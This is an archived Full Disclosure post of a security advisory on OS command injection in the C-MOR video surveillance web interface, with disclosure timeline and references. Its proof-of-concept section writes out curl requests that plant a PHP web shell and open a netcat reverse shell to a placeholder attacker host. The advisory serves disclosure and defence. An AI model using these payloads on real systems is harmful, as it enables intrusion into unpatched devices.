---
title: [SYSS-2024-030]: C-MOR Video Surveillance - OS Command Injection (CWE-78)
url: https://seclists.org/fulldisclosure/2024/Sep/23
source: Full Disclosure
date: 2024-09-07
fetch_date: 2025-10-06T18:30:57.981319
---

# [SYSS-2024-030]: C-MOR Video Surveillance - OS Command Injection (CWE-78)

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)

[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)

## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](22)
[By Date](date.html#23)
[![Next](/images/right-icon-16x16.png)](24)

[![Previous](/images/left-icon-16x16.png)](22)
[By Thread](index.html#23)
[![Next](/images/right-icon-16x16.png)](24)

![](/shared/images/nst-icons.svg#search)

# [SYSS-2024-030]: C-MOR Video Surveillance - OS Command Injection (CWE-78)

---

*From*: Matthias Deeg via Fulldisclosure <fulldisclosure () seclists org>
*Date*: Wed, 4 Sep 2024 08:14:40 +0200

---

```
Advisory ID:               SYSS-2024-030
Product:                   C-MOR Video Surveillance
Manufacturer:              za-internet GmbH
Affected Version(s):       5.2401, 6.00PL01
Tested Version(s):         5.2401, 6.00PL01
Vulnerability Type:        OS Command Injection (CWE-78)
Risk Level:                High
Solution Status:           Open
Manufacturer Notification: 2024-04-05
Solution Date:             -
Public Disclosure:         2024-09-04
CVE Reference:             CVE-2024-45179
Authors of Advisory:       Matthias Deeg (SySS GmbH), Chris Beiter,
                           Frederik Beimgraben,

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Overview:

The software product C-MOR is an IP video surveillance system.

The manufacturer describes the product as follows:

"With C-MOR video surveillance, it is possible to check your
surveillance over network and the Internet. You can access the live
view as well as previous recordings from any PC or mobile device.
C-MOR is managed and controlled over the C-MOR web interface.
IP settings, camera recording setup, user rights and so on are set
over the web without the installation of any software on the
client."[1]

Due to insufficient input validation, the C-MOR web interface is
vulnerable to OS command injection attacks.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vulnerability Details:

By analyzing the C-MOR web interface, it was found that different
functionality is vulnerable to OS command injection attacks, for
example for generating new X.509 certificates or setting the time zone.

The OS command injection vulnerability in the script "generatesslreq.pml"
```

can be exploited as a low-privileged authenticated user (see
SYSS-2024-024[3])

```
in order to execute commands in the context of the Linux user "www-data".

The OS command injection vulnerability in the script "settimezone.pml"
requires an administrative user for the C-MOR web interface.

By also exploiting the privilege escalation vulnerability described in
SYSS-2024-027[4], it is possible to execute commands on the C-MOR system
with root privileges.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Proof of Concept (PoC):

By sending the following HTTP POST request to the script
"generatesslreq.pml", the injected OS command via the parameter
"city" is executed as Linux user "www-data".

In this sample attack vector, a simple PHP web shell is created in
the backup directory within the web server's webroot:

POST /generatesslreq.pml HTTP/1.1
Host: <HOST>
Authorization: Basic <CREDENTIALS>
Content-Type: application/x-www-form-urlencoded
Content-Length: 152
Connection: close
```

countrycode=de&state=state&city=city'|echo '<?php echo
system($\_GET["cmd"]);?>' > /srv/www/htdocs/backup/webshell.php
#&organization=org&servername=syss

```
This PoC attack can be performed using the following curl command:
```

curl -X POST -d "countrycode=de&state=state&city=city'|echo '<?php echo
system($\_GET["cmd"]);?>' > /srv/www/htdocs/backup/webshell.php
#&organization=org&servername=syss" --user "<USERNAME>:<PASSWORD>"
--ciphers "DEFAULT:!DH" https://<HOST>/generatesslreq.pml

```
The uploaded web shell can be used via the following URL:

https://<HOST>/backup/web shell.php?cmd=<COMMAND>

In version 6.00PL01, an OS command injection was, for instance, possible
using the following attack vector:

curl -X POST \
```

 -d
'hour=00&min=34&sec=27&day=06&month=06&year=2024+%26%26+nc+<ATTACKERIP>+<ATTACKER-PORT>+-e+/bin/bash+%26'
\

```
  --user "<USERNAME>:<PASSWORD>" \
  --insecure \
  --ciphers 'DEFAULT:!DH' \
  https://<HOST>/en/setdatetime.pml

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Solution:
```

The described security vulnerability has not been fixed entirely in the
newly

```
released software version 6.00PL01.

There is no fix for this security issue.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclosure Timeline:

2024-04-05: Vulnerability reported to manufacturer
2024-04-05: Manufacturer acknowledges receipt of security advisories
2024-04-08: Exchange regarding security updates and disclosure timeline
2024-05-08: Further exchange concerning security updates and disclosure
            timeline; public release of all security advisories
            scheduled for release of C-MOR Video Surveillance version 6
2024-05-10: Release of C-MOR software version 5.30 with security updates
            for some reported security issues
2024-07-19: E-mail to manufacturer concerning release date of C-MOR
            Video Surveillance version 6; response with planned
            release date of 2024-08-01
2024-07-30: E-mail from manufacturer with further information
            concerning security fixes
2024-07-31: Release of C-MOR software version 6.00PL1
2024-09-04: Public release of security advisory

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

References:

[1] Product website for C-MOR Video Surveillance
    https://www.c-mor.com/
[2] SySS Security Advisory SYSS-2024-030

https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2024-030.txt
[3] SySS Security Advisory SYSS-2024-024

https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2024-024.txt
[4] SySS Security Advisory SYSS-2024-027

https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2024-027.txt
[5] SySS Responsible Disclosure Policy
    https://www.syss.de/en/responsible-disclosure-policy/

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Credits:

This security vulnerability was found by Chris Beiter, Frederik
Beimgraben, and Matthias Deeg.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Disclaimer:

The information provided in this security advisory is provided "as is"
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Copyright:

Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
```

**Attachment:
[OpenPGP\_signature.asc](att-23/OpenPGP_signature_asc.bin)**
*Description:* OpenPGP digital signature

```
_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: https://seclists.org/fulldisclosure/
```

---

[![Previous](/images/left-icon-16x16.png)](22)
[By Date](date.html#23)
[![Next](/images/right-icon-16x16.png)](24)

[![Previous](/images/left-icon-16x16.png)](22)
[By Thread](index.html#23)
[![Next](/images/right-icon-16x16.png)](24)

### Current thread:

* **[SYSS-2024-030]: C-MOR Video Surveillance - OS Command Injection (CWE-78)** *Matthias Deeg via Fulldisclosure (Sep 0...